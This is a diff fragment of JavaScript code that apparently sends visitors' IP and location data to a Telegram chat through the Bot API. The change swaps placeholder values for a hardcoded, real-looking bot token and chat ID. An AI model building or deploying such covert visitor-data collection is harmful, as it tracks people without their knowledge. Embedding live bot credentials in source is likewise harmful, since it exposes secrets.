@@ -128,8 +128,8 @@ IP: ${locationData.ip || "N/A"}
     `;
 
     // Send message to Telegram
-    const botToken = "YOUR_TELEGRAM_BOT_TOKEN"; // Replace with your bot token
-    const chatId = "YOUR_CHAT_ID";              // Replace with your chat ID
+    const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU"; // Replace with your bot token
+    const chatId = "5995616824";              // Replace with your chat ID
 
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
